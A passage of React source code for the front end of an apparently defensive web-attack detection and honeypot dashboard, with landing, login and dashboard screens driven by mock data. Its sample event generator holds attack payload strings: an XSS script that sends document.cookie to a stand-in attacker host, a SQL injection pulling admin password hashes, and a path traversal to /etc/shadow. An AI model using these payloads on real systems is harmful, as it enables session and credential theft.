import { useState, useEffect, useMemo } from "react";
import {
  LineChart,
  Line,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  Tooltip,
  ResponsiveContainer,
  Cell,
  PieChart,
  Pie,
} from "recharts";
import {
  checkBackendHealth,
  fetchLiveEvents,
  blockIP as apiBlockIP,
  unblockIP as apiUnblockIP,
} from "../services/guardianApi";

// ── Design Tokens ──────────────────────────────────────────────────────────
const T = {
  bg:       "#0D1117",
  surface:  "#161B22",
  surface2: "#21262D",
  border:   "#30363D",
  text:     "#E6EDF3",
  muted:    "#8B949E",
  low:      "#3FB950",
  lowBg:    "#0F2D1A",
  medium:   "#E3B341",
  medBg:    "#2D200A",
  high:     "#F0883E",
  highBg:   "#2D1500",
  critical: "#F85149",
  critBg:   "#2D0A0A",
  blue:     "#58A6FF",
  blueBg:   "#0C2340",
  purple:   "#A371F7",
  purpleBg: "#1E1040",
  green:    "#3FB950",
};

const sevColor = { LOW: T.low, MEDIUM: T.medium, HIGH: T.high, CRITICAL: T.critical };
const sevBg    = { LOW: T.lowBg, MEDIUM: T.medBg, HIGH: T.highBg, CRITICAL: T.critBg };
const sevDot   = { LOW: "●", MEDIUM: "●", HIGH: "●", CRITICAL: "◉" };

// ── Initial Mock Data ──────────────────────────────────────────────────────
const ATTACKS = ["SQLi", "XSS", "BruteForce", "PathTraversal", "Scanner"];
const COUNTRIES = [
  { name: "China", flag: "🇨🇳", city: "Beijing", isp: "China Telecom" },
  { name: "Russia", flag: "🇷🇺", city: "Moscow", isp: "Selectel Ltd" },
  { name: "Brazil", flag: "🇧🇷", city: "São Paulo", isp: "Locaweb" },
  { name: "Germany", flag: "🇩🇪", city: "Frankfurt", isp: "DFZ64 Europe Tor" },
  { name: "India", flag: "🇮🇳", city: "Mumbai", isp: "Jio Platforms" },
  { name: "USA", flag: "🇺🇸", city: "Ashburn", isp: "Amazon AWS" },
];
const IPS = [
  "192.168.1.100",
  "45.33.32.220",
  "103.21.244.1",
  "185.220.101.34",
  "91.108.4.0",
  "198.51.100.5",
];

function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randInt(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }

function genScore(type) {
  if (type === "SQLi") return randInt(75, 98);
  if (type === "XSS") return randInt(58, 85);
  if (type === "BruteForce") return randInt(62, 92);
  if (type === "PathTraversal") return randInt(54, 80);
  return randInt(30, 52);
}

function scoreLevel(s) {
  return s >= 85 ? "CRITICAL" : s >= 60 ? "HIGH" : s >= 30 ? "MEDIUM" : "LOW";
}

function genEvent() {
  const type = randItem(ATTACKS);
  const score = genScore(type);
  const countryObj = randItem(COUNTRIES);
  const endpoints = ["/login", "/admin", "/api/users", "/db", "/upload", "/search", "/.env", "/actuator/env"];
  const methods = ["POST", "GET", "POST", "PUT"];
  const payloads = {
    SQLi: "' UNION SELECT username, password_hash FROM admin_users--",
    XSS: "<script>fetch('//attacker.xyz/c?'+document.cookie)</script>",
    BruteForce: "admin:SuperSecret2026! [attempt #14]",
    PathTraversal: "../../../../etc/shadow",
    Scanner: "GET /wp-content/plugins/revslider/temp/update_extract/run.php",
  };

  return {
    id: Date.now() + Math.random(),
    ip: randItem(IPS),
    country: `${countryObj.flag} ${countryObj.name}`,
    countryName: countryObj.name,
    city: countryObj.city,
    isp: countryObj.isp,
    type,
    score,
    level: scoreLevel(score),
    time: new Date().toLocaleTimeString("en-GB", { hour12: false }),
    path: randItem(endpoints),
    method: randItem(methods),
    payload: payloads[type] || "Host scanner probe",
    status: score >= 85 ? "Trapped in Honeypot" : score >= 60 ? "Blocked by WAF" : "Monitored",
  };
}

const INITIAL_EVENTS = Array.from({ length: 16 }, (_, i) => {
  const e = genEvent();
  e.time = new Date(Date.now() - (15 - i) * 12000).toLocaleTimeString("en-GB", { hour12: false });
  return e;
});

const TIMELINE_DATA = [
  { hour: "00:00", LOW: 3, MEDIUM: 2, HIGH: 1, CRITICAL: 0 },
  { hour: "03:00", LOW: 5, MEDIUM: 4, HIGH: 2, CRITICAL: 1 },
  { hour: "06:00", LOW: 8, MEDIUM: 5, HIGH: 3, CRITICAL: 1 },
  { hour: "09:00", LOW: 14, MEDIUM: 9, HIGH: 6, CRITICAL: 3 },
  { hour: "12:00", LOW: 18, MEDIUM: 12, HIGH: 8, CRITICAL: 4 },
  { hour: "15:00", LOW: 15, MEDIUM: 10, HIGH: 7, CRITICAL: 2 },
  { hour: "18:00", LOW: 12, MEDIUM: 8, HIGH: 5, CRITICAL: 2 },
  { hour: "21:00", LOW: 7, MEDIUM: 4, HIGH: 3, CRITICAL: 1 },
];

const PIE_DATA = [
  { name: "SQLi", value: 42, color: "#F85149" },
  { name: "XSS", value: 28, color: "#F0883E" },
  { name: "BruteForce", value: 18, color: "#E3B341" },
  { name: "Scanner", value: 12, color: "#58A6FF" },
];

const INITIAL_ATTACKERS = [
  {
    ip: "192.168.1.100",
    country: "China",
    flag: "🇨🇳",
    city: "Beijing",
    isp: "China Telecom",
    ua: "sqlmap/1.7.8#dev (https://sqlmap.org)",
    lang: "zh-CN,zh;q=0.9",
    tools: ["sqlmap", "nikto"],
    first: "2026-06-01 09:14",
    last: "10:31",
    total: 47,
    sessions: 3,
    level: "CRITICAL",
  },
  {
    ip: "45.33.32.220",
    country: "Russia",
    flag: "🇷🇺",
    city: "Moscow",
    isp: "Selectel Ltd",
    ua: "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    lang: "ru-RU,ru;q=0.8",
    tools: ["nikto", "nmap"],
    first: "2026-06-02 11:20",
    last: "09:58",
    total: 31,
    sessions: 2,
    level: "HIGH",
  },
  {
    ip: "103.21.244.1",
    country: "Brazil",
    flag: "🇧🇷",
    city: "São Paulo",
    isp: "Locaweb",
    ua: "BurpSuite/2026.4.1 Professional",
    lang: "pt-BR,pt;q=0.9",
    tools: ["burpsuite"],
    first: "2026-06-03 14:02",
    last: "22:10",
    total: 28,
    sessions: 1,
    level: "HIGH",
  },
  {
    ip: "185.220.101.34",
    country: "Germany",
    flag: "🇩🇪",
    city: "Frankfurt",
    isp: "M247 Europe SRL (Tor Exit)",
    ua: "Hydra v9.5-dev network logon cracker",
    lang: "de-DE,de;q=0.7",
    tools: ["hydra"],
    first: "2026-06-04 18:33",
    last: "04:02",
    total: 19,
    sessions: 0,
    level: "MEDIUM",
  },
  {
    ip: "91.108.4.0",
    country: "India",
    flag: "🇮🇳",
    city: "Mumbai",
    isp: "Jio Platforms",
    ua: "DirBuster-1.0-RC1 (http://www.owasp.org/)",
    lang: "en-IN,hi;q=0.8",
    tools: ["dirbuster"],
    first: "2026-06-05 06:10",
    last: "06:15",
    total: 14,
    sessions: 0,
    level: "MEDIUM",
  },
  {
    ip: "198.51.100.5",
    country: "USA",
    flag: "🇺🇸",
    city: "Ashburn",
    isp: "Amazon AWS",
    ua: "python-requests/2.31.0",
    lang: "en-US,en;q=0.5",
    tools: ["sqlmap"],
    first: "2026-06-05 01:00",
    last: "01:20",
    total: 9,
    sessions: 0,
    level: "LOW",
  },
];

const INITIAL_BLOCKED = [
  {
    ip: "192.168.1.100",
    reason: "SQLi — Rule R1 + R6 (score 92)",
    blockedAt: "2026-06-07 10:31",
    expires: "Permanent",
    permanent: true,
  },
  {
    ip: "45.33.32.220",
    reason: "Scanner detected — Rule R6 (score 87)",
    blockedAt: "2026-06-07 10:20",
    expires: "2026-06-14 10:20",
    permanent: false,
  },
  {
    ip: "185.220.101.34",
    reason: "Brute force — Rule R4 (score 78)",
    blockedAt: "2026-06-06 22:05",
    expires: "2026-06-13 22:05",
    permanent: false,
  },
  {
    ip: "8.8.8.1",
    reason: "Path traversal — Rule R5 (score 69)",
    blockedAt: "2026-06-05 16:40",
    expires: "2026-06-12 16:40",
    permanent: false,
  },
];

const INITIAL_HONEYPOT_SESSIONS = [
  {
    id: "hp-901",
    ip: "192.168.1.100",
    country: "🇨🇳 China",
    started: "10:31:02",
    duration: "4m 12s",
    requestsCount: 38,
    live: true,
    actions: [
      { time: "10:31:02", method: "GET", endpoint: "/admin", tool: "sqlmap" },
      { time: "10:31:05", method: "GET", endpoint: "/admin/users", tool: "sqlmap" },
      { time: "10:31:09", method: "POST", endpoint: "/admin/db", tool: "sqlmap" },
      { time: "10:31:14", method: "GET", endpoint: "/admin/export", tool: "sqlmap" },
      { time: "10:31:22", method: "POST", endpoint: "/api/v1/auth/token", tool: "sqlmap" },
    ],
  },
  {
    id: "hp-902",
    ip: "45.33.32.220",
    country: "🇷🇺 Russia",
    started: "10:28:44",
    duration: "1m 08s",
    requestsCount: 14,
    live: true,
    actions: [
      { time: "10:28:44", method: "GET", endpoint: "/.env", tool: "nikto" },
      { time: "10:28:50", method: "GET", endpoint: "/wp-login.php", tool: "nikto" },
      { time: "10:29:12", method: "GET", endpoint: "/actuator/env", tool: "nmap" },
    ],
  },
  {
    id: "hp-903",
    ip: "103.21.244.1",
    country: "🇧🇷 Brazil",
    started: "09:54:10",
    duration: "0m 44s",
    requestsCount: 7,
    live: false,
    actions: [
      { time: "09:54:10", method: "POST", endpoint: "/api/comments", tool: "burpsuite" },
      { time: "09:54:22", method: "GET", endpoint: "/search?q=<script>", tool: "burpsuite" },
    ],
  },
  {
    id: "hp-904",
    ip: "198.51.100.5",
    country: "🇺🇸 USA",
    started: "08:12:30",
    duration: "2m 51s",
    requestsCount: 21,
    live: false,
    actions: [
      { time: "08:12:30", method: "GET", endpoint: "/login", tool: "python-requests" },
      { time: "08:12:45", method: "POST", endpoint: "/login", tool: "python-requests" },
    ],
  },
];

const INITIAL_SITES = [
  {
    name: "Fashion E-Store",
    url: "https://shop.trend.in",
    key: "gk_live_589041a998b",
    status: "Active",
    created: "2026-05-12",
    checks: "42,180",
  },
  {
    name: "Fintech Core API",
    url: "https://api.fintech.app",
    key: "gk_live_920114f003e",
    status: "Active",
    created: "2026-05-20",
    checks: "118,902",
  },
  {
    name: "Dev Blog",
    url: "https://blog.devstudio.io",
    key: "gk_live_382179a512c",
    status: "Paused",
    created: "2026-06-01",
    checks: "3,221",
  },
  {
    name: "Student Portal",
    url: "https://portal.eduhub.org",
    key: "gk_live_441022e891d",
    status: "Active",
    created: "2026-06-05",
    checks: "890",
  },
];

// ── Reusable UI Elements ───────────────────────────────────────────────────
function Badge({ level, small }) {
  const col = sevColor[level] || T.blue;
  const bg = sevBg[level] || T.blueBg;
  const dot = sevDot[level] || "●";
  return (
    <span
      style={{
        display: "inline-flex",
        alignItems: "center",
        gap: 4,
        padding: small ? "2px 6px" : "3px 10px",
        borderRadius: 4,
        background: bg,
        border: `1px solid ${col}`,
        color: col,
        fontSize: small ? 10 : 11,
        fontWeight: 600,
        letterSpacing: "0.04em",
      }}
    >
      <span style={{ fontSize: small ? 8 : 10 }}>{dot}</span>
      {level}
    </span>
  );
}

function ScoreBar({ score, compact }) {
  const color = score >= 85 ? T.critical : score >= 60 ? T.high : score >= 30 ? T.medium : T.low;
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
      <div
        style={{
          flex: 1,
          height: compact ? 4 : 6,
          background: T.surface2,
          borderRadius: 3,
          overflow: "hidden",
          minWidth: compact ? 40 : 60,
        }}
      >
        <div
          style={{
            width: `${score}%`,
            height: "100%",
            background: color,
            borderRadius: 3,
            transition: "width 0.4s ease",
            boxShadow: score >= 85 ? `0 0 6px ${color}40` : "none",
          }}
        />
      </div>
      <span
        style={{
          color,
          fontWeight: 700,
          fontSize: compact ? 11 : 13,
          minWidth: compact ? 22 : 28,
          fontFamily: "monospace",
        }}
      >
        {score}
      </span>
    </div>
  );
}

function Card({ children, style, glow }) {
  return (
    <div
      style={{
        background: T.surface,
        border: `1px solid ${glow ? T.critical + "60" : T.border}`,
        borderRadius: 8,
        padding: "16px",
        overflow: "hidden",
        boxShadow: glow ? `0 0 20px ${T.critical}15` : "none",
        ...style,
      }}
    >
      {children}
    </div>
  );
}

function PanelTitle({ icon, title, right }) {
  return (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
        <span style={{ fontSize: 13 }}>{icon}</span>
        <span style={{ color: T.text, fontWeight: 600, fontSize: 13, letterSpacing: "0.03em" }}>{title}</span>
      </div>
      {right && <span style={{ color: T.muted, fontSize: 11 }}>{right}</span>}
    </div>
  );
}

function StatCard({ icon, label, value, sub, color }) {
  color = color || T.blue;
  return (
    <Card style={{ flex: 1, minWidth: 0 }}>
      <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between" }}>
        <div>
          <div
            style={{
              color: T.muted,
              fontSize: 11,
              fontWeight: 500,
              letterSpacing: "0.05em",
              textTransform: "uppercase",
              marginBottom: 6,
            }}
          >
            {label}
          </div>
          <div style={{ color, fontSize: 30, fontWeight: 700, lineHeight: 1, fontFamily: "monospace" }}>{value}</div>
          <div style={{ color: T.muted, fontSize: 11, marginTop: 5 }}>{sub}</div>
        </div>
        <span style={{ fontSize: 20, opacity: 0.6 }}>{icon}</span>
      </div>
    </Card>
  );
}

function Btn({ children, primary, danger, small, onClick, style, disabled }) {
  const bg = primary ? T.blue : danger ? T.critical : T.surface2;
  const col = primary || danger ? "#0D1117" : T.blue;
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      style={{
        padding: small ? "4px 10px" : "7px 14px",
        background: disabled ? T.surface : bg,
        color: disabled ? T.muted : col,
        border: `1px solid ${primary ? T.blue : danger ? T.critical : T.border}`,
        borderRadius: 5,
        fontSize: small ? 11 : 12,
        fontWeight: 600,
        cursor: disabled ? "not-allowed" : "pointer",
        fontFamily: "inherit",
        transition: "all 0.15s",
        display: "inline-flex",
        alignItems: "center",
        justifyContent: "center",
        gap: 6,
        ...style,
      }}
    >
      {children}
    </button>
  );
}

function Modal({ title, isOpen, onClose, children, width = 500 }) {
  if (!isOpen) return null;
  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 10000,
        background: "rgba(0,0,0,0.75)",
        backdropFilter: "blur(6px)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: 20,
      }}
      onClick={onClose}
    >
      <div
        style={{
          width: "100%",
          maxWidth: width,
          background: T.surface,
          border: `1px solid ${T.border}`,
          borderRadius: 8,
          boxShadow: "0 10px 40px rgba(0,0,0,0.8)",
          overflow: "hidden",
        }}
        onClick={(e) => e.stopPropagation()}
      >
        <div
          style={{
            padding: "12px 18px",
            borderBottom: `1px solid ${T.border}`,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            background: T.surface2,
          }}
        >
          <div style={{ fontWeight: 600, fontSize: 14, color: T.text }}>{title}</div>
          <button
            onClick={onClose}
            style={{
              background: "transparent",
              border: "none",
              color: T.muted,
              fontSize: 18,
              cursor: "pointer",
            }}
          >
            ✕
          </button>
        </div>
        <div style={{ padding: 20, maxHeight: "80vh", overflowY: "auto" }}>{children}</div>
      </div>
    </div>
  );
}

// ── Screen: Landing ────────────────────────────────────────────────────────
function Landing({ onNav }) {
  const features = [
    {
      icon: "🤖",
      title: "Dual AI Engine",
      desc: "Isolation Forest anomaly detection + Random Forest classifier. Catches zero-day exploits pattern matching misses.",
    },
    {
      icon: "🍯",
      title: "Honeypot Trap",
      desc: "CRITICAL threats get routed into a convincing virtual Linux shell. Attackers stay trapped while full forensic telemetry is captured.",
    },
    {
      icon: "📊",
      title: "Live Dashboard",
      desc: "10 real-time panels. Live threat feed, geo map, attacker profiles, attack timeline — all updating autonomously.",
    },
    {
      icon: "🐍",
      title: "3-Line Python SDK",
      desc: "pip install cyber-guardian. Add 3 lines of middleware to FastAPI/Flask/Django. Your app is shielded in minutes.",
    },
  ];

  return (
    <div style={{ color: T.text, minHeight: "100vh" }}>
      {/* Nav */}
      <nav
        style={{
          position: "sticky",
          top: 0,
          zIndex: 100,
          background: `${T.bg}ee`,
          backdropFilter: "blur(12px)",
          borderBottom: `1px solid ${T.border}`,
          padding: "0 40px",
          height: 60,
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{ fontSize: 18 }}>🛡️</span>
          <span style={{ fontFamily: "monospace", fontWeight: 700, fontSize: 16, color: T.blue }}>
            AI Cyber Guardian
          </span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 24 }}>
          {["Docs", "Pricing", "About"].map((l) => (
            <span key={l} style={{ color: T.muted, fontSize: 13, cursor: "pointer" }}>
              {l}
            </span>
          ))}
          <Btn small onClick={() => onNav("login")}>
            Login
          </Btn>
          <Btn small primary onClick={() => onNav("login")}>
            Get Started →
          </Btn>
        </div>
      </nav>

      {/* Hero */}
      <div style={{ maxWidth: 900, margin: "0 auto", padding: "80px 40px 60px", textAlign: "center" }}>
        <div
          style={{
            display: "inline-flex",
            alignItems: "center",
            gap: 6,
            background: T.surface2,
            border: `1px solid ${T.border}`,
            borderRadius: 20,
            padding: "4px 12px",
            marginBottom: 24,
          }}
        >
          <span style={{ width: 6, height: 6, background: T.low, borderRadius: "50%", display: "block" }} />
          <span style={{ color: T.muted, fontSize: 12 }}>Live on DigitalOcean — 99.9% uptime</span>
        </div>

        <h1
          style={{
            fontSize: 52,
            fontWeight: 700,
            lineHeight: 1.1,
            marginBottom: 20,
            background: `linear-gradient(135deg, ${T.text} 60%, ${T.blue})`,
            WebkitBackgroundClip: "text",
            WebkitTextFillColor: "transparent",
          }}
        >
          Stop Web Attacks<br />Before They Reach Your App.
        </h1>
        <p style={{ fontSize: 17, color: T.muted, maxWidth: 520, margin: "0 auto 32px", lineHeight: 1.7 }}>
          AI-powered real-time detection, automatic blocking, and honeypot trapping — packaged in one Python SDK.
        </p>
        <div style={{ display: "flex", gap: 12, justifyContent: "center", marginBottom: 52 }}>
          <Btn primary onClick={() => onNav("dashboard")} style={{ padding: "10px 24px", fontSize: 14 }}>
            → View Live Dashboard
          </Btn>
          <button
            onClick={() => onNav("dashboard")}
            style={{
              padding: "10px 24px",
              background: "transparent",
              border: `1px solid ${T.border}`,
              color: T.text,
              borderRadius: 5,
              fontSize: 14,
              cursor: "pointer",
              fontFamily: "inherit",
            }}
          >
            ▶ Watch Demo
          </button>
        </div>

        {/* Code block */}
        <div
          style={{
            background: T.surface,
            border: `1px solid ${T.border}`,
            borderRadius: 10,
            textAlign: "left",
            overflow: "hidden",
            maxWidth: 560,
            margin: "0 auto",
          }}
        >
          <div
            style={{
              background: T.surface2,
              padding: "8px 16px",
              borderBottom: `1px solid ${T.border}`,
              display: "flex",
              alignItems: "center",
              gap: 6,
            }}
          >
            {["#F85149", "#E3B341", "#3FB950"].map((c) => (
              <span key={c} style={{ width: 10, height: 10, background: c, borderRadius: "50%" }} />
            ))}
            <span style={{ color: T.muted, fontSize: 11, marginLeft: 6 }}>terminal</span>
          </div>
          <div style={{ padding: "16px 20px", fontFamily: "monospace", fontSize: 13, lineHeight: 2 }}>
            <div>
              <span style={{ color: T.muted }}>$ </span>
              <span style={{ color: T.green }}>pip install cyber-guardian</span>
            </div>
            <div style={{ marginTop: 8 }}>
              <span style={{ color: T.purple }}>from</span>
              <span style={{ color: T.text }}> cyber_guardian </span>
              <span style={{ color: T.purple }}>import</span>
              <span style={{ color: T.text }}> Guardian</span>
            </div>
            <div>
              <span style={{ color: T.text }}>guard = Guardian(site_id=</span>
              <span style={{ color: T.medium }}>"..."</span>
              <span style={{ color: T.text }}>, api_key=</span>
              <span style={{ color: T.medium }}>"..."</span>
              <span style={{ color: T.text }}>)</span>
            </div>
            <div>
              <span style={{ color: T.text }}>result = </span>
              <span style={{ color: T.purple }}>await</span>
              <span style={{ color: T.text }}> guard.check(request)  </span>
              <span style={{ color: T.muted }}># ✓ protected</span>
            </div>
          </div>
        </div>
      </div>

      {/* Stats bar */}
      <div
        style={{
          borderTop: `1px solid ${T.border}`,
          borderBottom: `1px solid ${T.border}`,
          padding: "20px 40px",
          display: "flex",
          justifyContent: "center",
          gap: 60,
          background: T.surface,
        }}
      >
        {[
          ["91.3%", "Detection Accuracy"],
          ["< 3s", "Response Time"],
          ["< 10%", "False Positive Rate"],
          ["6", "Attack Types"],
        ].map(([v, l]) => (
          <div key={l} style={{ textAlign: "center" }}>
            <div style={{ fontSize: 26, fontWeight: 700, color: T.blue, fontFamily: "monospace" }}>{v}</div>
            <div style={{ fontSize: 11, color: T.muted, marginTop: 2 }}>{l}</div>
          </div>
        ))}
      </div>

      {/* Features */}
      <div style={{ maxWidth: 900, margin: "60px auto", padding: "0 40px" }}>
        <div style={{ textAlign: "center", marginBottom: 36 }}>
          <h2 style={{ fontSize: 28, fontWeight: 700, color: T.text, marginBottom: 8 }}>
            Everything you need to protect your app
          </h2>
          <p style={{ color: T.muted, fontSize: 14 }}>One platform. One SDK. Complete protection.</p>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
          {features.map((f) => (
            <Card key={f.title} style={{ padding: "20px 22px" }}>
              <div style={{ fontSize: 24, marginBottom: 10 }}>{f.icon}</div>
              <div style={{ fontWeight: 600, fontSize: 15, color: T.text, marginBottom: 6 }}>{f.title}</div>
              <div style={{ color: T.muted, fontSize: 13, lineHeight: 1.6 }}>{f.desc}</div>
            </Card>
          ))}
        </div>
      </div>

      {/* Pricing */}
      <div style={{ maxWidth: 900, margin: "0 auto 80px", padding: "0 40px" }}>
        <div style={{ textAlign: "center", marginBottom: 32 }}>
          <h2 style={{ fontSize: 26, fontWeight: 700, color: T.text }}>Simple pricing</h2>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 16 }}>
          {[
            {
              name: "Free",
              price: "₹0",
              desc: "1 website · 1,000 checks/day · Community support",
              cta: "Get Started",
              primary: false,
            },
            {
              name: "Pro",
              price: "₹999/mo",
              desc: "5 websites · 50,000 checks/day · Email support · PDF reports",
              cta: "Start Free Trial",
              primary: true,
            },
            {
              name: "Enterprise",
              price: "Custom",
              desc: "Unlimited sites · Unlimited checks · 24/7 support · Custom rules",
              cta: "Contact Us",
              primary: false,
            },
          ].map((p) => (
            <Card
              key={p.name}
              style={{
                padding: "22px",
                border: `1px solid ${p.primary ? T.blue : T.border}`,
                boxShadow: p.primary ? `0 0 20px ${T.blue}20` : undefined,
              }}
            >
              <div style={{ fontWeight: 700, fontSize: 16, color: p.primary ? T.blue : T.text, marginBottom: 4 }}>
                {p.name}
              </div>
              <div style={{ fontSize: 24, fontWeight: 700, color: T.text, marginBottom: 10, fontFamily: "monospace" }}>
                {p.price}
              </div>
              <div style={{ color: T.muted, fontSize: 12, lineHeight: 1.7, marginBottom: 16 }}>{p.desc}</div>
              <Btn primary={p.primary} small style={{ width: "100%", justifyContent: "center" }} onClick={() => onNav("login")}>
                {p.cta}
              </Btn>
            </Card>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── Screen: Login ──────────────────────────────────────────────────────────
function Login({ onNav }) {
  const [email, setEmail] = useState("client@example.com");
  const [pass, setPass] = useState("••••••••••");
  const [loading, setLoading] = useState(false);

  const inputStyle = {
    width: "100%",
    background: T.surface2,
    border: `1px solid ${T.border}`,
    color: T.text,
    borderRadius: 5,
    padding: "9px 12px",
    fontSize: 13,
    fontFamily: "inherit",
    outline: "none",
  };

  function submit() {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      onNav("dashboard");
    }, 600);
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        background: `radial-gradient(ellipse at 50% 0%, ${T.surface} 0%, ${T.bg} 70%)`,
      }}
    >
      <nav
        style={{
          padding: "16px 40px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          borderBottom: `1px solid ${T.border}`,
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 8, cursor: "pointer" }} onClick={() => onNav("landing")}>
          <span>🛡️</span>
          <span style={{ fontFamily: "monospace", fontWeight: 700, color: T.blue }}>AI Cyber Guardian</span>
        </div>
        <span style={{ color: T.muted, fontSize: 12, cursor: "pointer" }} onClick={() => onNav("landing")}>
          ← Back to home
        </span>
      </nav>
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyCenter: "center", justifyContent: "center", padding: 24 }}>
        <Card style={{ width: "100%", maxWidth: 380, padding: "32px 30px" }}>
          <div style={{ textAlign: "center", marginBottom: 28 }}>
            <span style={{ fontSize: 32 }}>🛡️</span>
            <h2 style={{ fontSize: 20, fontWeight: 700, color: T.text, margin: "10px 0 4px" }}>Welcome back</h2>
            <p style={{ color: T.muted, fontSize: 13 }}>Sign in to your account</p>
          </div>
          <div style={{ marginBottom: 16 }}>
            <label style={{ color: T.muted, fontSize: 12, display: "block", marginBottom: 5 }}>Email</label>
            <input value={email} onChange={(e) => setEmail(e.target.value)} placeholder="your@email.com" style={inputStyle} />
          </div>
          <div style={{ marginBottom: 8 }}>
            <label style={{ color: T.muted, fontSize: 12, display: "block", marginBottom: 5 }}>Password</label>
            <input
              value={pass}
              onChange={(e) => setPass(e.target.value)}
              type="password"
              placeholder="••••••••••"
              style={inputStyle}
            />
          </div>
          <div style={{ textAlign: "right", marginBottom: 20 }}>
            <span style={{ color: T.blue, fontSize: 11, cursor: "pointer" }}>Forgot password?</span>
          </div>
          <button
            onClick={submit}
            style={{
              width: "100%",
              padding: "10px",
              background: loading ? T.surface2 : T.blue,
              color: loading ? T.muted : "#0D1117",
              border: "none",
              borderRadius: 5,
              fontSize: 13,
              fontWeight: 600,
              cursor: loading ? "not-allowed" : "pointer",
              fontFamily: "inherit",
              transition: "all 0.2s",
            }}
          >
            {loading ? "Signing in..." : "Sign In →"}
          </button>
          <p style={{ textAlign: "center", color: T.muted, fontSize: 12, marginTop: 16 }}>
            No account? <span style={{ color: T.blue, cursor: "pointer" }}>Register</span>
          </p>
        </Card>
      </div>
    </div>
  );
}

// ── Screen: Dashboard ──────────────────────────────────────────────────────
function Dashboard({ onNav, onOpenAttacker }) {
  const [activeNav, setActiveNav] = useState("overview");
  const [events, setEvents] = useState(INITIAL_EVENTS);
  const [blockedList, setBlockedList] = useState(INITIAL_BLOCKED);
  const [honeypotSessions, setHoneypotSessions] = useState(INITIAL_HONEYPOT_SESSIONS);
  const [attackers, setAttackers] = useState(INITIAL_ATTACKERS);
  const [sites, setSites] = useState(INITIAL_SITES);
  const [newId, setNewId] = useState(null);
  const [backendOnline, setBackendOnline] = useState(false);

  // Modals & UI States
  const [addSiteModal, setAddSiteModal] = useState(false);
  const [blockIPModal, setBlockIPModal] = useState(false);
  const [terminalReplaySession, setTerminalReplaySession] = useState(null);
  const [expandedSessionId, setExpandedSessionId] = useState("hp-901");
  const [reportSuccessModal, setReportSuccessModal] = useState(false);

  // Search & Filter inputs
  const [searchFilter, setSearchFilter] = useState("");
  const [severityFilter, setSeverityFilter] = useState("ALL");
  const [attackerSearch, setAttackerSearch] = useState("");
  const [expandedEventId, setExpandedEventId] = useState(null);

  // New Site Form
  const [newSiteName, setNewSiteName] = useState("");
  const [newSiteUrl, setNewSiteUrl] = useState("");

  // New Block Form
  const [newBlockIP, setNewBlockIP] = useState("");
  const [newBlockReason, setNewBlockReason] = useState("");
  const [newBlockDuration, setNewBlockDuration] = useState("Permanent");

  // Settings state
  const [showApiKey, setShowApiKey] = useState(false);
  const [apiKey, setApiKey] = useState("gk_live_94fa2014b281cc9381e0029b");
  const [notifySettings, setNotifySettings] = useState({
    emailAlerts: true,
    criticalOnly: true,
    weeklyDigest: true,
  });

  // Check backend health periodically
  useEffect(() => {
    checkBackendHealth().then(setBackendOnline);
    const h = setInterval(() => checkBackendHealth().then(setBackendOnline), 15000);
    return () => clearInterval(h);
  }, []);

  // Event stream tick every 3.5 seconds
  useEffect(() => {
    const t = setInterval(async () => {
      // If backend is online, attempt fetching live events
      let newEvent = null;
      if (backendOnline) {
        const live = await fetchLiveEvents();
        if (live && live.length > 0) {
          const first = live[0];
          newEvent = {
            id: Date.now() + Math.random(),
            ip: first.ip,
            country: "🇨🇳 Live Origin",
            countryName: "Live Origin",
            city: "Cloud Node",
            isp: "Enterprise",
            type: first.rule_id || "Live Attack",
            score: first.score || 85,
            level: scoreLevel(first.score || 85),
            time: new Date().toLocaleTimeString("en-GB", { hour12: false }),
            path: first.path || "/api/v1/auth",
            method: "POST",
            payload: first.matched_pattern || "Detected signature",
            status: "Blocked",
          };
        }
      }

      if (!newEvent) {
        newEvent = genEvent();
      }

      setNewId(newEvent.id);
      setEvents((prev) => [newEvent, ...prev].slice(0, 64));
      setTimeout(() => setNewId(null), 600);
    }, 3500);

    return () => clearInterval(t);
  }, [backendOnline]);

  const navItems = [
    { id: "overview", icon: "⚡", label: "Overview" },
    { id: "feed", icon: "📋", label: "Live Feed" },
    { id: "analytics", icon: "📊", label: "Analytics" },
    { id: "geo", icon: "🌍", label: "Geo Map" },
    { id: "blocked", icon: "🚫", label: "Blocked IPs" },
    { id: "honeypot", icon: "🍯", label: "Honeypot" },
    { id: "attackers", icon: "👤", label: "Attackers" },
  ];

  const bottomNavItems = [
    { id: "sites", icon: "🌐", label: "Sites" },
    { id: "reports", icon: "📄", label: "Reports" },
    { id: "settings", icon: "⚙️", label: "Settings" },
  ];

  // Overview metrics
  const totalThreats = events.length;
  const blockedCount = blockedList.length;
  const honeypotLiveCount = honeypotSessions.filter((s) => s.live).length;

  // Handlers
  function handleUnblock(ip) {
    apiUnblockIP(ip);
    setBlockedList((prev) => prev.filter((b) => b.ip !== ip));
  }

  function handleCreateBlock() {
    if (!newBlockIP) return;
    apiBlockIP(newBlockIP, newBlockReason);
    setBlockedList((prev) => [
      {
        ip: newBlockIP,
        reason: newBlockReason || "Manual security rule enforcement",
